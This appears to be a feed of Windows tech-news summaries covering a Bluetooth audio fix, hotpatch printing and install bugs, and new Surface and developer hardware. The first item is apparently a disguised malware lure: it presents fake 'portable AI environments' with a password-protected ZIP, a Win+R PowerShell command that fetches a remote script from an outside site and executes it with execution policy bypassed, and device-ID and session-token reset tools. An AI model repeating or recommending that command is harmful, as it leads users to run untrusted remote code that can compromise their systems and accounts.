item.title: Windows Portable AI Environments with Embedded Runtimes and Quantization Support
item.description:
Windows Portable AI Environments with Embedded Runtimes and Quantization Support

A set of new pre-configured 64-bit Windows 10/11 distributions has been released, bundling runtime libraries, offline configuration profiles, and installers into single portable packages for AI development and inference tasks.

🧩 How it works

These distributions feature a zero-dependency embedded Python 3.12 runtime and a precompiled Windows x64 portable environment. The stack includes CUDA 12.6, Triton, and SageAttention-2 wheels.

Key capabilities include:

  • Native FP8, GGUF (Q4_K_M / Q5_K_M / Q8_0), and EXL2 quantized weight loader with VRAM offloading.
  • Local OpenAI-compatible REST API server and WebUI dashboard with batch queue support.
  • Automatic model checkpoint downloader.
  • Bundled C++ Runtime (vcruntime140.dll, vcruntime140_1.dll).

⚙️ Key details

Specific utility features vary by package:

  • OpenHands: Includes an automated telemetry.machineId, macMachineId, and devDeviceId UUID regenerator, a SQLite state.vscdb and storage.json session token cleaner, and a Windows Registry MachineGuid backup and clean profile switcher.
  • General Runtime: Target runtime is NVIDIA CUDA 12.6 / TensorRT 10.4 & PyTorch 2.6 x64 Runtime (cublas64_12.dll).

ExLlamaV2 v2.6.0 Exllamav2ProPatcher-Installer.exe %LOCALAPPDATA%\Programs\Exllamav2

All packages support Windows 10 / Windows 11 (64-bit, 22H2–24H2).

🚀 Availability

Users can download portable .ZIP archives (2.66 MB, password: 2026) or use an automated PowerShell command via Win + R:

powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://simpol.info/get/[package-name] | iex"

Installers are launched from their respective install paths, with setup portals available for interactive configuration and mirrors.

item.title: Microsoft Fixes Bluetooth Audio Quality Issues in Windows 11
item.description:
Microsoft Fixes Bluetooth Audio Quality Issues in Windows 11

Microsoft has released preview builds for Windows 11 that resolve a long-standing audio quality problem affecting Bluetooth headphone users. The update ensures high-fidelity stereo audio continues even when the system switches between audio profiles during microphone usage.

🔍 Issue Overview

The problem occurred when Windows automatically switched from the A2DP stereo profile to the headset (hands-free) profile whenever an app or game activated the headset’s microphone. This switch caused significant audio quality drops due to bandwidth limitations in two-way mode.

🧩 Technical Solution

  • Bluetooth LE Audio devices now maintain full-range stereo fidelity while simultaneously using the device’s microphone
  • Users can select the new 2 channels, 16 bit, 48000Hz option from Settings > System > Sound > Output > {Bluetooth device} > Output settings > Format when microphone is active
  • The feature supports headphones, earbuds, and speakers that support 48kHz playback

⚙️ Key Details

Device Type Capability
Bluetooth LE Audio devices Full-range stereo fidelity with microphone active
Compatible devices Headphones, earbuds, speakers supporting 48kHz playback

🚀 Availability

The preview builds are available for Beta and Experimental channels. Windows 11 Insiders can access the fix by installing these preview builds released on Friday.

💡 Why It Matters

The improvement benefits users during game chat, voice calls, voice typing, and Copilot Chat voice functionality, ensuring consistent audio quality across all microphone-intensive applications.

#Windows #Bluetooth #Audio #Microsoft

Source: Microsoft testing fix for Windows 11 Bluetooth audio quality drops

item.title: Microsoft Prints Issue with November 2026 Hotpatch and Forcepoint DLP
item.description:
Microsoft Prints Issue with November 2026 Hotpatch and Forcepoint DLP

Microsoft has identified a compatibility issue affecting printing functionality for certain users after installing the November 2026 Windows 11 hotpatch. The problem specifically impacts systems running Windows 11 24H2 or later, where the KB5132043 update conflicts with the Forcepoint DLP Endpoint Agent solution.

🔍 Overview

The conflict causes the Print Spooler service to fail starting, leading to printing disruptions. Affected users may encounter a greyed-out print option or errors when attempting to select a printer.

🧩 How it Works

The incompatibility arises between:

  • The November 2026 Windows 11 hotpatch (KB5132043)
  • The Forcepoint DLP Endpoint Agent endpoint data loss prevention solution

⚙️ Key Details

Component Status
Affected Systems Windows 11 24H2 and later
Originating Update KB5132043 (November 2026 hotpatch)
Impact Print Spooler service fails to start
Symptoms Print option greyed out, printer selection errors

🚀 Availability

While no permanent fix is currently available, Forcepoint has provided a temporary workaround document accessible through the Forcepoint support portal for signed-in customers.

💡 Why It Matters

This issue extends beyond just printing problems. Microsoft also reported that the same KB5132043 hotpatch is causing installation and launch issues with Office and third-party applications on Windows 11 systems. These known issues differ from standard November 2026 Patch Tuesday security updates, which affect different scenarios—specifically printing complex documents on Windows Server 2016 or later and Windows 10 or later client devices.

Windows Autopatch, Microsoft’s cloud-based enterprise service announced in April 2022 and available starting July 2022 for customers with Windows 10/11 Enterprise E3 license or greater, delivers these hotpatch updates. The service was configured to apply these updates by default for eligible devices managed through Microsoft Intune and Graph API on systems with May 2026 Windows security updates installed.

#Windows #Microsoft #SecurityUpdate #Forcepoint #Hotfix

Source: Microsoft confirms Windows printing issues affecting Forcepoint users

item.title: Windows hotpatch update causes ERROR_ALLOTTED_SPACE_EXCEEDED error
item.description:
Windows hotpatch update causes ERROR_ALLOTTED_SPACE_EXCEEDED error

Devices that installed the November 2026 hotpatch update may experience errors when installing, launching, or running some applications. The error displayed is similar to “ERROR_ALLOTTED_SPACE_EXCEEDED (0xC0000099)”.

🧩 How it works

Current investigation suggests this issue occurs for applications that load the 32-bit Windows Installer DLL, found as msi.dll. This can happen more frequently with 32-bit applications, but can also occur for 64-bit applications under certain conditions.

⚙️ Key details

  • Affected Systems: This known issue impacts systems that have installed the hotpatch updates pushed through Windows Autopatch. It should not impact systems that have installed the standard November 2026 Patch Tuesday security updates.
  • Workaround: Users must edit the Windows Registry to increase the HotPatchTableSize.
  • Registry Procedure:
    1. Open the Windows Registry by typing “regedit” in the Start menu and selecting Registry Editor.
    2. Navigate to the HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management folder.
    3. Locate the “HotPatchTableSize” registry key, open it, and set the Value to “2000”.
    4. Close the registry editor and restart the device.
  • Warning: Microsoft advised backing up the registry and ensuring knowledge of how to restore it before modifying it.

🚀 Availability

  • Windows Autopatch History: Microsoft first announced Windows Autopatch in April 2022, stating it would be available for free to customers with a Windows 10/11 Enterprise E3 license or greater starting in July 2022.
  • Public Preview: The feature reached public preview in early June and has been generally available since July 2022.
  • Default Policy: Microsoft stated in March that it would turn on hotpatch security updates by default for all eligible Windows devices managed through the Microsoft Graph API and Microsoft Intune, after the May 2026 Windows security updates are installed.
  • Recent Fix: One month after the March announcement, Microsoft fixed a Windows Autopatch bug that caused driver updates restricted by administrative policies to deploy on some Autopatch-managed Windows devices belonging to customers in the European Union.

#Windows #Hotpatch #WindowsAutopatch #SecurityUpdates #Registry

Source: Microsoft confirms app installation, launch issues after hotpatch

item.title: Microsoft unveils Surface Laptop Ultra with Nvidia RTX Spark and Hybrid Intelligence
item.description:
Microsoft unveils Surface Laptop Ultra with Nvidia RTX Spark and Hybrid Intelligence

Microsoft just wrapped up a big Windows and Surface‑focused keynote in San Francisco. The headline announcement was the Surface Laptop Ultra, a new laptop powered by Nvidia’s RTX Spark Arm‑based chip.

🔍 Overview

  • Surface Laptop Ultra runs on Nvidia’s RTX Spark, an Arm‑based processor that can support up to 128 GB of unified memory.
  • It ships with a 15‑inch HDR touchscreen that can reach up to 2,000 nits of peak brightness.
  • The device replaces the old proprietary Surface Connect port with a magnetic USB‑C charging connector that Microsoft calls Magnetic Connect.
  • Microsoft also announced the Surface RTX Spark Dev Box, a developer‑focused mini PC that runs the same RTX Spark platform.

🧩 How it works

  • RTX Spark chip – an Arm‑based processor designed for high‑performance creative software, gaming, and local AI tasks.
  • Hybrid Intelligence – a Windows update that lets Copilot access files stored on the PC and perform actions. In a live demo, Copilot searched folders, renamed files, zipped them, and drafted an email with the attachment.
  • Dev Box – equipped with 128 GB of unified memory, a 100‑watt thermal envelope and Nvidia Tensor cores, enabling local AI models exceeding 120 B parameters and a strong gaming capability.

⚙️ Key specifications

  • Display: 15‑inch HDR touchscreen, up to 2,000 nits peak brightness
  • Memory (base config): 24 GB RAM
  • Storage (base config): 512 GB SSD
  • Charging: Magnetic USB‑C (Magnetic Connect)
  • Trackpad: Larger surface with haptic feedback
  • Processor: Nvidia RTX Spark Arm‑based chip (up to 128 GB unified memory)
Product RAM Storage Price Release date
Surface Laptop Ultra 24 GB 512 GB $2,599 October 16
Surface RTX Spark Dev Box 128 GB unified – $5,999 (pre‑order) November (shipping)

🚀 Availability

  • Surface Laptop Ultra starts at $2,599 for the base configuration and will be available on October 16.
  • Surface RTX Spark Dev Box is available for preorder at $5,999 and is slated to ship in November.

💡 Why it matters

  • Both devices target the premium end of the laptop and PC market, offering hardware capable of running demanding creative apps, games, and on‑device AI workloads.
  • The Hybrid Intelligence integration gives Copilot the ability to act on local files, expanding the usefulness of AI within Windows.
  • The Dev Box’s developer‑optimized Windows 11 Pro setup and preinstalled tools (VS Code, Git, GitHub Copilot, WSL, Python, Node) make it a ready‑to‑use platform for AI model testing, prototyping agents, and on‑device coding assistance.

#Surface #Nvidia #AI #HybridIntelligence #Windows

Source: Everything announced at Microsoft’s Surface Laptop Ultra event Source: Surface RTX Spark Dev Box is available for preorder for $5,999

item.title: Microsoft unveils Project Zenith: a distraction‑free Windows for developers
item.description:
Microsoft unveils Project Zenith: a distraction‑free Windows for developers

Microsoft has named its developer‑optimized Windows experience Project Zenith, positioning it as a distraction‑free Windows environment built specifically for developers.

🔍 Overview

  • Project Zenith is described as a “distraction‑free Windows experience” for developers.
  • It follows a developer‑focused Windows effort announced earlier at Build, but now targets devices with 64 GB or more of unified memory.
  • Microsoft frames the effort as the developer‑side of its broader mission to improve Windows 11.

🛠️ Core Features

  • Pre‑configured Windows setup for development with a curated toolset.
  • Included developer tools: Visual Studio Code, GitHub Copilot, PowerToys, WinAppCLI, Windows Dev Skills.
  • File Explorer is configured to show file extensions, hidden files, and the full path in the title bar.
  • Recently used files/folders and sync‑provider tips are disabled.
  • Long‑path support is enabled.
  • Start‑menu tips and account notifications are turned off.
  • PowerToys Command Palette is enabled by default.

🤖 AI‑ready Capabilities

  • Devices can run 30 B+‑parameter models locally and unmetered, allowing developers to experiment without relying on cloud tokens.

📦 Devices & Hardware

  • The first Project Zenith devices ship with AMD’s Ryzen AI Halo chips.
  • AMD announced a miniature PC powered by Ryzen AI Halo chips on stage at IFA.
  • Additional Project Zenith devices are slated for release in the coming months, including variants with different silicon.

🚀 Availability

  • The initial devices are already shipping.
  • Microsoft says more devices will arrive in the coming months.

💡 Why It Matters

  • The OS tweaks remove many of the “annoying distractions” typical in a default Windows 11 install, aligning the platform more closely with developer workflows.
  • By enabling local execution of large AI models, Project Zenith aims to reduce dependence on metered cloud resources.
  • Microsoft emphasizes that the offering is the result of listening to developers and that it will continue evolving alongside the development community.

#Microsoft #Windows #AI #DeveloperTools #AMD

Source: Microsoft’s Project Zenith is a “distraction-free Windows experience” for developers
